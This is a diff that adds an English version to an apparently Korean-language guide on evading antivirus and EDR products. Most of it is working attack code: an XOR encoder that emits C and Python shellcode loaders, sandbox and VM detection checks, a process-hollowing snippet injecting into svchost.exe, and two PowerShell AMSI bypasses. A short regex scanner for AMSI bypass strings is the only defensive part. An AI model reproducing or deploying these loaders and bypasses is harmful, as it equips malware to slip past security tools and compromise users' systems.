@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # AV/EDR 우회 기법 — 인코딩·다형성·탐지 회피
 
 ## 1. AV 탐지 메커니즘
@@ -384,3 +390,394 @@ if __name__ == "__main__":
 | 샌드박스 우회 | 환경 탐지 후 분기 | 동적 분석 우회 |
 | 메모리 우회 | 직접 시스템 콜, 무파일 실행 | EDR 우회 |
 | AMSI 우회 | 런타임 패칭, 반사 로딩 | 스크립트 스캔 우회 |
+
+---
+
+<a name="english"></a>
+
+# AV/EDR Evasion Techniques — Encoding, Polymorphism, Detection Evasion
+
+## 1. AV Detection Mechanisms
+
+| Detection Method   | Description                          | Bypass Method                              |
+|--------------------|--------------------------------------|--------------------------------------------|
+| Signature-based    | Known byte pattern matching          | Encoding, encryption, polymorphism         |
+| Heuristic          | Suspicious behavior pattern detection| Behavior distribution, delayed execution   |
+| Dynamic analysis   | Sandbox execution analysis           | Branch after sandbox detection             |
+| Machine learning   | ML model-based classification        | Feature manipulation, adversarial examples |
+| Memory scanning    | Runtime memory inspection            | Memory encryption, inline patching         |
+
+---
+
+## 2. Payload Encoding Techniques
+
+### 2.1 Basic XOR Encoding
+
+```python
+#!/usr/bin/env python3
+"""Payload XOR encoding/decoding CLI."""
+
+import argparse
+import os
+from pathlib import Path
+
+
+def xor_encode(data: bytes, key: bytes) -> bytes:
+    key_len = len(key)
+    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))
+
+
+def generate_xor_loader(encoded: bytes, key: bytes, language: str = "c") -> str:
+    encoded_hex = ", ".join(f"0x{b:02x}" for b in encoded)
+    key_hex = ", ".join(f"0x{b:02x}" for b in key)
+
+    if language == "c":
+        return f"""
+#include <windows.h>
+#include <string.h>
+
+unsigned char payload[] = {{ {encoded_hex} }};
+unsigned char key[] = {{ {key_hex} }};
+const SIZE_T payload_len = {len(encoded)};
+const SIZE_T key_len = {len(key)};
+
+void decode_payload(unsigned char* data, SIZE_T data_len, const unsigned char* k, SIZE_T k_len) {{
+    for (SIZE_T i = 0; i < data_len; i++) {{
+        data[i] ^= k[i % k_len];
+    }}
+}}
+
+int main() {{
+    decode_payload(payload, payload_len, key, key_len);
+
+    LPVOID exec_mem = VirtualAlloc(NULL, payload_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) return 1;
+
+    memcpy(exec_mem, payload, payload_len);
+
+    HANDLE thread = CreateThread(NULL, 0,
+        (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    WaitForSingleObject(thread, INFINITE);
+
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    return 0;
+}}
+"""
+    elif language == "python":
+        return f"""
+import ctypes
+import os
+
+PAYLOAD = bytes([{encoded_hex}])
+KEY = bytes([{key_hex}])
+
+def decode(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+shellcode = decode(PAYLOAD, KEY)
+buf = ctypes.create_string_buffer(shellcode, len(shellcode))
+func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(buf))
+func()
+"""
+    return ""
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Payload XOR encoder")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    enc_p = sub.add_parser("encode", help="Encode payload")
+    enc_p.add_argument("payload", type=Path, help="Original payload file")
+    enc_p.add_argument("-k", "--key", help="XOR key (random if not specified)")
+    enc_p.add_argument("-o", "--output", type=Path, help="Output file")
+    enc_p.add_argument("--lang", choices=["c", "python"], default="c", help="Loader language")
+
+    dec_p = sub.add_parser("decode", help="Decode payload")
+    dec_p.add_argument("payload", type=Path)
+    dec_p.add_argument("-k", "--key", required=True)
+    dec_p.add_argument("-o", "--output", type=Path)
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "encode":
+            raw = args.payload.read_bytes()
+            key_bytes = args.key.encode() if args.key else os.urandom(16)
+            encoded = xor_encode(raw, key_bytes)
+
+            loader = generate_xor_loader(encoded, key_bytes, args.lang)
+            ext = ".c" if args.lang == "c" else ".py"
+            out = args.output or args.payload.with_suffix(f"_loader{ext}")
+            out.write_text(loader)
+            print(f"[+] Encoding complete")
+            print(f"  Key: {key_bytes.hex()}")
+            print(f"  Original: {len(raw)} bytes → Encoded: {len(encoded)} bytes")
+            print(f"  Loader: {out}")
+
+        case "decode":
+            raw = args.payload.read_bytes()
+            key_bytes = bytes.fromhex(args.key)
+            decoded = xor_encode(raw, key_bytes)  # XOR is symmetric
+            out = args.output or args.payload.with_suffix(".decoded.bin")
+            out.write_bytes(decoded)
+            print(f"[+] Decoding complete: {out}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. Sandbox Detection Techniques
+
+```python
+#!/usr/bin/env python3
+"""Sandbox environment detection — branch based on execution environment."""
+
+import ctypes
+import os
+import platform
+import time
+import winreg
+from pathlib import Path
+
+
+def check_username() -> bool:
+    """Detect common sandbox usernames."""
+    sandbox_users = {
+        "sandbox", "malware", "maltest", "virus", "antivirus",
+        "av", "john", "user", "analyst", "test",
+    }
+    current = os.getenv("USERNAME", "").lower()
+    return current in sandbox_users
+
+
+def check_cpu_count() -> bool:
+    """Virtualized environments usually have 1-2 CPUs."""
+    import multiprocessing
+    return multiprocessing.cpu_count() <= 2
+
+
+def check_ram_size() -> bool:
+    """Sandboxes usually have less than 2GB RAM."""
+    if platform.system() == "Windows":
+        kernel32 = ctypes.windll.kernel32
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", ctypes.c_ulong),
+                ("dwMemoryLoad", ctypes.c_ulong),
+                ("ullTotalPhys", ctypes.c_ulonglong),
+                ("ullAvailPhys", ctypes.c_ulonglong),
+                ("ullTotalPageFile", ctypes.c_ulonglong),
+                ("ullAvailPageFile", ctypes.c_ulonglong),
+                ("ullTotalVirtual", ctypes.c_ulonglong),
+                ("ullAvailVirtual", ctypes.c_ulonglong),
+                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+            ]
+        mem_status = MEMORYSTATUSEX()
+        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+        kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
+        return mem_status.ullTotalPhys < 2 * 1024 ** 3  # Less than 2GB
+    return False
+
+
+def check_vm_artifacts() -> bool:
+    """Detect VM artifacts (VMware/VirtualBox/Hyper-V)."""
+    vm_indicators = [
+        # VMware
+        r"SOFTWARE\VMware, Inc.\VMware Tools",
+        # VirtualBox
+        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
+        # QEMU
+        r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
+    ]
+
+    if platform.system() != "Windows":
+        vm_files = ["/sys/class/dmi/id/product_name"]
+        for f in vm_files:
+            try:
+                content = Path(f).read_text().lower()
+                if any(v in content for v in ["virtualbox", "vmware", "qemu", "kvm"]):
+                    return True
+            except OSError:
+                pass
+        return False
+
+    for key_path in vm_indicators:
+        try:
+            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            return True
+        except FileNotFoundError:
+            pass
+    return False
+
+
+def check_timing() -> bool:
+    """Timing attack detection — sandboxes accelerate time."""
+    start = time.perf_counter()
+    time.sleep(5)
+    elapsed = time.perf_counter() - start
+    return elapsed < 4.5  # Suspected acceleration if 5s sleep completes in less than 4.5s
+
+
+def check_recent_files() -> bool:
+    """Suspected sandbox if no recent user files exist."""
+    if platform.system() == "Windows":
+        recent_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Recent"
+        if recent_dir.exists():
+            files = list(recent_dir.glob("*.lnk"))
+            return len(files) < 5
+    return False
+
+
+def is_sandbox() -> tuple[bool, list[str]]:
+    """Return sandbox detection results."""
+    checks = {
+        "username": check_username,
+        "cpu_count": check_cpu_count,
+        "ram_size": check_ram_size,
+        "vm_artifacts": check_vm_artifacts,
+        "recent_files": check_recent_files,
+    }
+
+    triggered: list[str] = []
+    for name, check in checks.items():
+        try:
+            if check():
+                triggered.append(name)
+        except Exception:
+            pass
+
+    return len(triggered) >= 2, triggered
+```
+
+---
+
+## 4. Process Injection Techniques
+
+```c
+// Process Hollowing — inject payload into a legitimate process
+#include <windows.h>
+#include <tlhelp32.h>
+
+// 1. Create legitimate process (Suspended)
+STARTUPINFOA si = {0};
+PROCESS_INFORMATION pi = {0};
+si.cb = sizeof(si);
+
+CreateProcessA(
+    "C:\\Windows\\System32\\svchost.exe",
+    NULL, NULL, NULL, FALSE,
+    CREATE_SUSPENDED | CREATE_NO_WINDOW,
+    NULL, NULL, &si, &pi
+);
+
+// 2. Unmap original entry point
+HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+pNtUnmapViewOfSection NtUnmapViewOfSection =
+    (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
+
+// 3. Allocate memory and write payload
+LPVOID remote_mem = VirtualAllocEx(pi.hProcess, (LPVOID)preferred_base,
+    payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(pi.hProcess, remote_mem, payload, payload_size, NULL);
+
+// 4. Modify thread context and resume
+CONTEXT ctx = {0};
+ctx.ContextFlags = CONTEXT_INTEGER;
+GetThreadContext(pi.hThread, &ctx);
+ctx.Rcx = (DWORD64)entry_point;  // x64
+SetThreadContext(pi.hThread, &ctx);
+ResumeThread(pi.hThread);
+```
+
+---
+
+## 5. AMSI Bypass
+
+AMSI (Antimalware Scan Interface) scans scripts such as PowerShell and VBA at runtime.
+
+```powershell
+# AMSI bypass technique 1 — amsiInitFailed flag
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
+$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
+$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# AMSI bypass technique 2 — memory patching (amsi.dll)
+$a = [System.Runtime.InteropServices.Marshal]
+$b = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$c = $b.GetField('amsiSession','NonPublic,Static')
+$c.SetValue($null, $null)
+```
+
+```python
+#!/usr/bin/env python3
+"""AMSI bypass technique detection — static analysis."""
+
+import re
+import argparse
+from pathlib import Path
+
+
+AMSI_BYPASS_PATTERNS = [
+    (re.compile(r"amsiInitFailed", re.IGNORECASE), "amsiInitFailed flag manipulation"),
+    (re.compile(r"AmsiScanBuffer|AmsiScanString", re.IGNORECASE), "Direct AMSI API reference"),
+    (re.compile(r"amsi\.dll", re.IGNORECASE), "Direct amsi.dll load"),
+    (re.compile(r"amsiSession", re.IGNORECASE), "amsiSession set to null"),
+    (re.compile(r"0xB8,?\s*0x57,?\s*0x00,?\s*0x07,?\s*0x80", re.IGNORECASE), "AMSI patch bytes"),
+]
+
+
+def scan_file(filepath: Path) -> list[tuple[int, str, str]]:
+    findings = []
+    try:
+        lines = filepath.read_text(encoding="utf-8", errors="ignore").splitlines()
+        for lineno, line in enumerate(lines, 1):
+            for pattern, desc in AMSI_BYPASS_PATTERNS:
+                if pattern.search(line):
+                    findings.append((lineno, desc, line.strip()[:100]))
+    except OSError:
+        pass
+    return findings
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="AMSI bypass code detection")
+    parser.add_argument("path", type=Path, help="File or directory to scan")
+    args = parser.parse_args()
+
+    files = list(args.path.rglob("*.ps1")) + list(args.path.rglob("*.py")) \
+        if args.path.is_dir() else [args.path]
+
+    total_findings = 0
+    for f in files:
+        findings = scan_file(f)
+        if findings:
+            print(f"\n[!] {f}")
+            for lineno, desc, code in findings:
+                print(f"  L{lineno}: {desc}")
+                print(f"    {code}")
+            total_findings += len(findings)
+
+    print(f"\nTotal {total_findings} AMSI bypass attempts found")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. AV Evasion Strategy Summary
+
+| Strategy           | Technique                                          | Effect                        |
+|--------------------|----------------------------------------------------|-------------------------------|
+| Signature bypass   | XOR/AES encryption, custom encoder                 | Bypass static detection       |
+| Behavioral bypass  | Delayed execution, distributed execution, use legitimate processes | Bypass heuristics |
+| Sandbox bypass     | Detect environment then branch                     | Bypass dynamic analysis       |
+| Memory bypass      | Direct syscalls, fileless execution                | Bypass EDR                    |
+| AMSI bypass        | Runtime patching, reflective loading               | Bypass script scanning        |
